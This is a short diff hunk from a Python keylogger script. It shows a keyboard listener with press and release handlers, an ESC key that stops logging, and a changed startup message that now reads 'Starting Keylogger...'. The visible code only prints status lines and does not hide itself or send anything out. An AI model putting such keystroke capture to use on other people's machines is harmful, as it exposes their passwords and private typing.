@@ -16,7 +16,7 @@ def on_release(key):
     if key == keyboard.Key.esc:
         print("Logging stopped.")
         return False
-print("[+]Logging keys from user")
+print("[+]Starting Keylogger...")
 print("[+]Logging... Press ESC to stop.")
 with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
